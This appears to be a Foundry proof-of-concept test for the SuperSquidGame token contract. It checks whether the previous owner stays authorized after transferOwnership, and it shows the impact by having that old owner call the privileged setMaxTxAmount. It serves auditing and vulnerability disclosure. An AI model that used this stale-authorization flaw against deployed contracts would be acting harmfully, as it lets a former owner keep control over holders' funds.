// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SuperSquidGame.sol";

contract TransferOwnershipTest is Test {
    SuperSquidGame token;
    
    address oldOwner = makeAddr("oldOwner");
    address newOwner = makeAddr("newOwner");
    address constant ROUTER_ADDR = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address factoryAddr = makeAddr("factory");
    address wethAddr = makeAddr("weth");
    address pairAddr = makeAddr("pair");

    function setUp() public {
        // Mock router factory call
        vm.mockCall(
            ROUTER_ADDR,
            abi.encodeWithSignature("factory()"),
            abi.encode(factoryAddr)
        );
        
        // Mock router WETH call
        vm.mockCall(
            ROUTER_ADDR,
            abi.encodeWithSignature("WETH()"),
            abi.encode(wethAddr)
        );
        
        // Mock factory createPair call
        vm.mockCall(
            factoryAddr,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(pairAddr)
        );

        // Deploy token contract
        vm.startPrank(oldOwner);
        token = new SuperSquidGame(oldOwner);
        vm.stopPrank();
    }

    function test_transferOwnershipLeavesOldOwnerAuthorized() public {
        // Log pre-trigger authorization status
        console2.log("--- BEFORE-Trigger Authorization Status ---");
        bool isOldOwnerAuthorizedBefore = token.isAuthorized(oldOwner);
        console2.log("Old owner authorized (before):", isOldOwnerAuthorizedBefore);
        assertTrue(isOldOwnerAuthorizedBefore, "Old owner should be authorized initially");
        
        // Log trigger operation
        console2.log("--- Trigger TransferOwnership ---");
        // Transfer ownership to new address
        vm.prank(oldOwner);
        token.transferOwnership(newOwner);
        
        // Log post-trigger authorization status
        console2.log("--- AFTER-Trigger Authorization Status ---");
        bool isOldOwnerAuthorizedAfter = token.isAuthorized(oldOwner);
        console2.log("Old owner authorized (after):", isOldOwnerAuthorizedAfter);
        
        // Verify new owner state
        assertEq(token.owner(), newOwner, "Ownership not transferred");
        assertTrue(token.isAuthorized(newOwner), "New owner should be authorized");
        
        // Final vulnerability check based on authorization persistence
        if (isOldOwnerAuthorizedAfter) {
            console2.log("Authorization status unchanged: Vulnerability exploited");
            
            // Demonstrate impact only if vulnerability exists
            uint256 minAllowedTx = token.totalSupply() / 1000;
            vm.prank(oldOwner);
            token.setMaxTxAmount(minAllowedTx);
            
            vm.prank(makeAddr("randomUser"));
            vm.expectRevert();
            token.setMaxTxAmount(minAllowedTx);
            
            console2.log("Vulnerability Exists: Old owner retains privileged access after ownership transfer");
        } else {
            console2.log("Authorization status changed: Vulnerability not exploited");
            console2.log("Vulnerability not Exist: Ownership transfer function correctly removes authorization");
        }
    }
}